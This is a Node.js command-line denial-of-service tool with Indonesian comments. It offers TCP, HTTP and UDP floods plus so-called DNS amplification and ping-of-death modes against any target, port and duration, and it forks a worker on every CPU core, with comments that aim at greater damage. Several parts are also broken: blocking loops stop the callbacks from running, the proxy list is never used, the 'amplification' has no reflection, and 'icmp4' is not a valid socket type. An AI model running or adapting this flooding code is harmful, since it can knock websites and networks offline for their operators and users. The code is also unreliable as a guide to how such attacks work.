const http = require('http');
const https = require('https');
const net = require('net');
const dgram = require('dgram');
const fs = require('fs');
const cluster = require('cluster');
const os = require('os');
const crypto = require('crypto');

// Membaca proxy dan user-agent dari file
const proxies = fs.readFileSync('proxy.txt', 'utf-8').split('\n').map(x => x.trim()).filter(Boolean);
const userAgents = fs.readFileSync('user-agents.txt', 'utf-8').split('\n').map(x => x.trim()).filter(Boolean);

// Daftar serangan
const attacks = {
    'tcp-flood': { name: 'TCP Flood', description: 'For WiFi and Website', handler: tcpFlood },
    'http-flood': { name: 'HTTP Flood', description: 'For Website', handler: httpFlood },
    'udp-flood': { name: 'UDP Flood', description: 'For WiFi', handler: udpFlood },
    'dns-amplification': { name: 'DNS Amplification', description: 'For WiFi and Website', handler: dnsAmplification },
    'ping-of-death': { name: 'Ping of Death', description: 'For WiFi and Website', handler: pingOfDeath }
};

// Fungsi untuk membersihkan terminal dan menampilkan menu
function displayMenu() {
    console.clear();
    console.log('========================================');
    console.log('        ATTACK TOOL v999999999 FINAL       ');
    console.log('========================================\n');
    console.log('Choose your attack type and usage:\n');

    Object.keys(attacks).forEach((key, index) => {
        console.log(`   ${index + 1}. node attack.js ${key} <target> <port> <time>`);
        console.log(`      ${attacks[key].name} - ${attacks[key].description}\n`);
    });

    console.log('Example usage:');
    console.log('   node attack.js tcp-flood 192.168.1.1 80 60');
    console.log('Press Ctrl+C to exit.');
}

// Progress counter untuk output
function progressCounter(type, count) {
    process.stdout.write(`\r${type} packets sent: ${count}`);
}

// Multi-threading menggunakan cluster untuk meningkatkan dampak serangan
if (cluster.isMaster) {
    const numWorkers = os.cpus().length;
    for (let i = 0; i < numWorkers; i++) {
        cluster.fork();
    }
    cluster.on('exit', (worker) => {
        console.log(`Worker ${worker.process.pid} exited. Restarting...`);
        cluster.fork();
    });
} else {
    const args = process.argv.slice(2);
    if (args.length === 4) {
        const attackType = args[0];
        const target = args[1];
        const port = parseInt(args[2], 10);
        const duration = parseInt(args[3], 10);

        const attack = attacks[attackType];
        if (attack) {
            console.clear();
            console.log(`Launching ${attack.name} Attack`);
            console.log(`Target: ${target}:${port}`);
            console.log(`Duration: ${duration} seconds`);
            console.log('========================================');
            attack.handler(target, port, duration);
        } else {
            console.log('Invalid attack type!');
            displayMenu();
        }
    } else {
        displayMenu();
    }

    // TCP Flood - Serangan yang sangat intensif
    async function tcpFlood(target, port, duration) {
        const endTime = Date.now() + duration * 1000;
        let sentPackets = 0;
        while (Date.now() < endTime) {
            const client = new net.Socket();
            client.connect(port, target, () => {
                const payload = crypto.randomBytes(102400);  // Menggunakan buffer yang lebih besar untuk dampak lebih besar
                client.write(payload);
                client.end();
                sentPackets++;
                progressCounter('TCP', sentPackets);
            });
            client.on('error', () => {});
        }
    }

    // HTTP Flood - Memaksimalkan Proksi dan Koneksi Simultan
    async function httpFlood(target, port, duration) {
        const endTime = Date.now() + duration * 1000;
        let sentRequests = 0;
        while (Date.now() < endTime) {
            const proxy = proxies[Math.floor(Math.random() * proxies.length)];
            const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
            const options = {
                hostname: target,
                port,
                path: '/',
                headers: { 'User-Agent': userAgent }
            };

            const req = https.request(options, (res) => {
                sentRequests++;
                progressCounter('HTTP', sentRequests);
            });

            req.on('error', () => {});
            req.end();
        }
    }

    // UDP Flood - Mengirimkan Payload dalam jumlah besar dengan kecepatan tinggi
    async function udpFlood(target, port, duration) {
        const endTime = Date.now() + duration * 1000;
        const message = crypto.randomBytes(102400);  // Menggunakan payload lebih besar untuk dampak lebih besar
        const client = dgram.createSocket('udp4');
        let sentPackets = 0;
        while (Date.now() < endTime) {
            client.send(message, 0, message.length, port, target, () => {
                sentPackets++;
                progressCounter('UDP', sentPackets);
            });
        }
    }

    // DNS Amplification - Meningkatkan Serangan dengan Payload yang Lebih Besar
    async function dnsAmplification(target, port, duration) {
        const endTime = Date.now() + duration * 1000;
        const message = crypto.randomBytes(1024);  // Payload besar untuk lebih banyak amplifikasi
        const client = dgram.createSocket('udp4');
        let sentPackets = 0;
        while (Date.now() < endTime) {
            client.send(message, 0, message.length, port, target, () => {
                sentPackets++;
                progressCounter('DNS', sentPackets);
            });
        }
    }

    // Ping of Death - Menambah Beban dengan Data Acak yang Lebih Besar
    async function pingOfDeath(target, port, duration) {
        const endTime = Date.now() + duration * 1000;
        const message = crypto.randomBytes(102400);  // Payload lebih besar untuk memberikan dampak lebih kuat
        const client = dgram.createSocket('icmp4');
        let sentPackets = 0;
        while (Date.now() < endTime) {
            client.send(message, 0, message.length, port, target, () => {
                sentPackets++;
                progressCounter('POD', sentPackets);
            });
        }
    }
}